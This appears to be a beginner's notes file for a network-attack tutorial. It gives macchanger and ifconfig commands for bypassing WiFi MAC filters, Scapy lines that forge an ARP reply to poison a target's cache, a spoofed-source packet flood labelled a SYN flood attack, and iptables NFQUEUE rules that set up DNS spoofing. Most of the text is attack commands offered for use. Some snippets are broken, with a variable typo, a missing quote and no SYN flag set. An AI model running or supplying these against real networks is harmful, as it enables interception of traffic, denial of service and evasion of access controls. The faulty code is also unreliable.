# We will be coding our own SPOOFERS, SNIFFERS, DNS SNIFFERS,
# PACKET SNIFFERS, FTP CREDENTIAL SNIFFERS MAC CHANGERS ANS SO ON.........

### 1)MAC CHANGERS:

    IF SOME WIFI THAT EITHER USERS BLACKLIST OR WHITE LIST YOU CAN USE PROGRAM TO BYPASS THESE LISTS.

    # macchanger --show eth0
    # sudo macchanger --mac=aa:bb:ee:ff:ee:SS eth0
    # using linux commands:
        # sudo ifconfig eth0 down
        # sudo ifconfig eth0 hw ether AA:BB:CC:DD:EE:FF
        # sudo ifconfig eth0 up



### 2)ARP packets
      #arp -a
      #ls(ARP)
      #broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
      #arppacket = ARP(pdst='192.168.43.1')
      #arppacket.show()
      #finalpacket=broadcast/arppacket
      #finalpacket.show()
      #answer=srp(finalpacket,timeout=2,verbose=True)[0]
      #macaddress=answer[0][1].hwsrc

  #crafting malicious packets:
      #finalpacket.pdst='192.168.43.56'
      #answer=srp(finalpacket,timeout=2,verbose=False)[0]
      #mac=answer[0][1].hwsrc
      #packet=ARP(op=2,hwdst='78:2b:46:74:af:40',pdst='192.168.43.56',psrc='192.168.43.1)
      #send(packet,verbose=False)



    pdst=Pdestination stands for target IP address
    hwdst=Hardware destination stands fot target Mac address
    psrc=pSource stands for source of our Ip location
    hwsrc=Hardware source stands for source of our Mac location
    op = type of packet we wanted to send(1-arp request,2-arp reply)

###  3)SYNFLOODER ATTACK:

  Sending TCP packets to target, spamming it with a bumch of packets and them macking an over connection to open port and making it not to run any software on the open port or connect to internet.

   #scapy
            # IPayer = IP()
            # IPlayer.show()
            # TCPlayer = TCP()
            # pkt = IPlayer/TCPlayer
            # raw = Raw()
            # pkt = pkt/raw
            # pkt.src = '192.168.43.150'
            # pkt.dst = '192.168.43.56'
            # pkt.src = '8.8.8.8'
            # pkt.load = 'hello bro I am Danger '
            # send(pkt)

### DNS SPOOFER

           # iptables --flush
           # iptables -I FORWARD -j NFQUEUE --queue-num 0
           # iptables -I OUTPUT -j NFQUEUE --queue-num 0
           # iptables -I INPUT -j NFQUEUE --queue-num 0
